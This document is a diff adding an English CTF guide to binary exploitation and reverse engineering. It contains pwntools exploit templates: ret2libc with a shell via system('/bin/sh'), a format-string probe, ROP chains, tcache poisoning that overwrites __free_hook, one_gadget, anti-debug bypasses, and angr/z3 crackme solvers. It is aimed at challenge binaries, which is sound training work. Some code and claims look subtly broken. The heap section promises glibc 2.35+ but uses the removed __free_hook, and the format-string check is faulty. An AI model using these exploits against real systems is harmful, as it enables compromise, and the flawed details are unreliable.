@@ -407,3 +407,417 @@ one_gadget ./libc.so.6
 one_gadget = libc.address + 0x50a37
 payload = flat(b'A' * offset, one_gadget)
 ```
+
+---
+
+<a name="english"></a>
+
+# PWN and REV CTF Techniques
+
+PWN (binary exploitation) and REV (reverse engineering) are the most technical categories in CTF competitions. This section covers practical techniques from writing complete exploits with pwntools to automating crackme solutions with angr/z3.
+
+---
+
+## 1. Understanding Protections
+
+### 1.1 Interpreting checksec Output
+
+```bash
+checksec --file=./binary
+
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+```
+
+| Protection | Description | Bypass Method |
+|---------|------|---------|
+| ASLR | Runtime address randomization | Information leak, brute force |
+| PIE | Binary itself randomized | Leak code base then calculate |
+| NX/DEP | Stack/heap non-executable | ROP chain |
+| Stack Canary | Stack overflow detection | Canary leak, brute force (fork) |
+| RELRO Full | GOT not writable | __malloc_hook, __free_hook, etc. |
+
+---
+
+## 2. Complete pwntools Exploit Template
+
+```python
+#!/usr/bin/env python3
+"""pwntools CTF exploit template — production-ready"""
+
+from pwn import *
+import sys
+
+
+# ── Binary/context setup ───────────────────────────────
+ELF_PATH = "./binary"
+LIBC_PATH = "./libc.so.6"   # Provided libc (None if not available)
+HOST = "challenges.ctf.site"
+PORT = 1337
+
+context.binary = elf = ELF(ELF_PATH)
+context.arch = 'amd64'
+context.log_level = 'info'  # debug / info / warning
+
+libc = ELF(LIBC_PATH) if LIBC_PATH else None
+
+
+def get_io(target: str = "local") -> tube:
+    """Switch between local/remote"""
+    if target == "remote":
+        return remote(HOST, PORT)
+    elif target == "gdb":
+        return gdb.debug(ELF_PATH, gdbscript="""
+            b main
+            b *vuln+42
+            continue
+        """)
+    else:
+        return process(ELF_PATH)
+
+
+# ── Utilities ────────────────────────────────────────────
+def p(x): return pack(x)   # 64-bit pack
+def u(x): return unpack(x) # 64-bit unpack
+
+def leak_addr(io: tube, offset: int = 0) -> int:
+    """Leak 6-byte address (printf %s format)"""
+    raw = io.recv(6)
+    return u(raw.ljust(8, b'\x00')) + offset
+
+
+# ── Exploit functions ──────────────────────────────────────
+def exploit_ret2win(io: tube) -> None:
+    """ret2win: return to win() function in binary"""
+    win = elf.symbols.get('win') or elf.symbols.get('flag')
+    if not win:
+        log.failure("Cannot find win function")
+        return
+
+    # Calculate stack padding (identify offset with cyclic pattern)
+    # Generate cyclic pattern: cyclic(200) → check crash in gdb with pattern offset
+    OFFSET = 72  # Change to actual value
+
+    payload = flat(
+        b'A' * OFFSET,
+        elf.sym['ret'],  # Stack alignment (Ubuntu 18.04+)
+        win,
+    )
+    io.sendlineafter(b"> ", payload)
+
+
+def exploit_ret2libc(io: tube) -> None:
+    """ret2libc: leak libc address via puts/printf → system("/bin/sh")"""
+    assert libc is not None, "libc.so.6 path required"
+
+    OFFSET = 72  # Change to actual offset
+    rop = ROP(elf)
+
+    # Find gadgets
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret_gadget = rop.find_gadget(['ret'])[0]
+
+    # Stage 1: puts(puts@GOT) → leak libc address
+    stage1 = flat(
+        b'A' * OFFSET,
+        pop_rdi,
+        elf.got['puts'],
+        elf.plt['puts'],
+        elf.sym['main'],  # Return to main for stage 2
+    )
+    io.sendlineafter(b"> ", stage1)
+
+    # Calculate libc base
+    puts_leak = u(io.recv(6).ljust(8, b'\x00'))
+    libc.address = puts_leak - libc.sym['puts']
+    log.success(f"libc @ 0x{libc.address:016x}")
+
+    # Stage 2: system("/bin/sh")
+    bin_sh = next(libc.search(b'/bin/sh'))
+    stage2 = flat(
+        b'A' * OFFSET,
+        ret_gadget,           # 16-byte alignment
+        pop_rdi,
+        bin_sh,
+        libc.sym['system'],
+    )
+    io.sendlineafter(b"> ", stage2)
+
+
+def exploit_format_string(io: tube) -> None:
+    """Format string: leak address from stack or arbitrary write"""
+    # Detect offset: send %1$p %2$p ... %30$p then find canary position
+    for i in range(1, 50):
+        io.sendlineafter(b"> ", f"%{i}$p".encode())
+        try:
+            val = int(io.recvline().strip(), 16)
+            if val == 0x00007ffd:  # Stack address prefix
+                log.info(f"Stack address offset: {i}")
+        except ValueError:
+            pass
+
+    # Arbitrary write: %<value>c%<offset>$n
+    # target_addr = elf.got['puts']
+    # payload = fmtstr_payload(offset, {target_addr: new_value})
+
+
+def exploit_heap(io: tube) -> None:
+    """Heap exploit: tcache poisoning (glibc 2.35+)"""
+    # tcache poisoning + safe-linking bypass
+    # 1. Allocate two chunks
+    # 2. Free second chunk → free third chunk (double free)
+    # 3. Overwrite fd pointer (XOR demangling required: glibc 2.32+)
+    # 4. Allocate target address → overwrite
+    pass
+
+
+# ── Main ────────────────────────────────────────────────
+def main() -> None:
+    target = sys.argv[1] if len(sys.argv) > 1 else "local"
+    io = get_io(target)
+
+    try:
+        exploit_ret2libc(io)
+        io.interactive()
+    except EOFError:
+        log.failure("Connection closed")
+    finally:
+        io.close()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 3. ROP Chain Construction
+
+### 3.1 Finding Gadgets with ROPgadget
+
+```bash
+# Find gadgets
+ROPgadget --binary ./binary --rop
+
+# Filter specific gadget
+ROPgadget --binary ./binary --rop | grep "pop rdi"
+
+# Auto-generate chain
+ROPgadget --binary ./binary --rop --chain "execve"
+```
+
+### 3.2 pwntools ROP Class
+
+```python
+from pwn import *
+
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+rop = ROP([elf, libc])
+
+# Automatic chain construction
+rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])
+print(rop.dump())
+payload = flat(b'A' * 72, rop.chain())
+```
+
+---
+
+## 4. Reverse Engineering
+
+### 4.1 Anti-Debugging Bypass
+
+```python
+# Anti-debug bypass via ptrace (LD_PRELOAD)
+# ptrace.c
+# int ptrace(int request, ...) { return 0; }
+# 
+# gcc -shared -fPIC ptrace.c -o fake_ptrace.so
+# LD_PRELOAD=./fake_ptrace.so ./binary
+
+# GDB: bypass IsDebuggerPresent
+# (gdb) break IsDebuggerPresent
+# (gdb) return 0
+
+# pwndbg: bypass timing check
+# (gdb) set {int}0x<rdtsc_call_addr> = 0x90909090
+```
+
+### 4.2 Automating Crackme with angr
+
+```python
+#!/usr/bin/env python3
+"""Solve crackme automatically with angr symbolic execution"""
+
+import angr
+import claripy
+import sys
+
+
+def solve_crackme(binary_path: str, flag_length: int = 32) -> str | None:
+    """
+    Principle: angr symbolically explores all execution paths
+    Finds the path that outputs "Correct!" and reverses the input
+    """
+    proj = angr.Project(binary_path, auto_load_libs=False)
+
+    # Symbolic flag (unknown input)
+    flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(flag_length)]
+    flag = claripy.Concat(*flag_chars)
+
+    # Initial state (flag as stdin input)
+    state = proj.factory.full_init_state(
+        stdin=angr.SimFile(content=flag, seekable=True)
+    )
+
+    # Constraint: flag is printable ASCII
+    for c in flag_chars:
+        state.solver.add(c >= 0x20)
+        state.solver.add(c <= 0x7E)
+
+    # Exploration setup
+    sm = proj.factory.simulation_manager(state)
+
+    # Set success/failure addresses
+    # Check in IDA/Ghidra then enter address
+    # find = proj.loader.main_object.min_addr + 0x1234  # "Correct!" address
+    # avoid = proj.loader.main_object.min_addr + 0x1256  # "Wrong!" address
+    
+    # Or search by stdout string
+    sm.explore(
+        find=lambda s: b"Correct" in s.posix.dumps(1),
+        avoid=lambda s: b"Wrong" in s.posix.dumps(1),
+    )
+
+    if sm.found:
+        found_state = sm.found[0]
+        flag_value = found_state.solver.eval(flag, cast_to=bytes)
+        return flag_value.decode('latin-1', errors='replace')
+
+    return None
+
+
+def solve_with_z3(conditions: list) -> str | None:
+    """Find input satisfying conditions using z3 SMT solver"""
+    from z3 import Solver, BitVec, And, sat, simplify
+
+    s = Solver()
+    flag = [BitVec(f'x{i}', 8) for i in range(32)]
+
+    # ASCII constraints
+    for c in flag:
+        s.add(c >= 0x20, c <= 0x7E)
+
+    # Add conditions extracted from binary
+    # Example: flag[0] ^ flag[1] == 0x42
+    # s.add(flag[0] ^ flag[1] == 0x42)
+    # s.add(flag[0] + flag[2] == 0xAB)
+
+    if s.check() == sat:
+        model = s.model()
+        return ''.join(chr(model[c].as_long()) for c in flag)
+
+    return None
+
+
+def main() -> None:
+    import argparse
+    parser = argparse.ArgumentParser(description="Crackme auto-solver CLI")
+    parser.add_argument("binary", help="Path to crackme binary")
+    parser.add_argument("--length", type=int, default=32, help="Flag length")
+    parser.add_argument("--tool", choices=["angr", "z3"], default="angr")
+
+    args = parser.parse_args()
+
+    print(f"[*] Starting solve with {args.tool}: {args.binary}")
+    
+    if args.tool == "angr":
+        result = solve_crackme(args.binary, args.length)
+    else:
+        print("[!] z3 solve requires manual condition code addition")
+        result = None
+
+    if result:
+        print(f"[+] Flag: {result}")
+    else:
+        print("[-] Solve failed")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. Heap Exploitation Basics
+
+### 5.1 tcache poisoning (glibc 2.32+ safe-linking)
+
+```python
+from pwn import *
+
+io = process('./heap_challenge')
+libc = ELF('./libc.so.6')
+
+def alloc(size: int, data: bytes) -> None:
+    io.sendline(b'1')
+    io.sendline(str(size).encode())
+    io.sendline(data)
+
+def free(idx: int) -> None:
+    io.sendline(b'2')
+    io.sendline(str(idx).encode())
+
+def view(idx: int) -> bytes:
+    io.sendline(b'3')
+    io.sendline(str(idx).encode())
+    return io.recvline()
+
+# 1. Leak heap address (using UAF vulnerability)
+alloc(0x20, b'A' * 8)  # chunk 0
+free(0)
+heap_leak = u64(view(0)[:6].ljust(8, b'\x00'))
+
+# 2. Safe-linking demangling (glibc 2.32+)
+# actual_addr = leaked ^ (heap_base >> 12)
+heap_base = heap_leak << 12  # approximate heap base
+
+# 3. Manipulate tcache pointer → overwrite __free_hook
+target = libc.sym['__free_hook']
+poisoned_fd = target ^ (heap_base >> 12)  # apply mangling
+
+alloc(0x20, b'B' * 8)   # reallocate chunk 0
+alloc(0x20, b'C' * 8)   # chunk 1
+free(1)
+free(0)                  # tcache: 0 → 1
+# overwrite fd
+alloc(0x20, p64(poisoned_fd))
+alloc(0x20, b'X' * 8)   # pop 1 from tcache
+alloc(0x20, p64(libc.sym['system']))  # __free_hook = system
+
+# 4. free("/bin/sh") → system("/bin/sh")
+alloc(0x20, b'/bin/sh\x00')
+free(7)
+io.interactive()
+```
+
+---
+
+## 6. Using one_gadget
+
+```bash
+# Find one_gadget RCE gadgets in libc
+one_gadget ./libc.so.6
+
+# Sample output:
+# 0x50a37 execve("/bin/sh", rsp+0x70, environ)
+# constraints: rsp & 0xf == 0
+# rax == NULL
+
+# Usage in Python
+one_gadget = libc.address + 0x50a37
+payload = flat(b'A' * offset, one_gadget)
+```
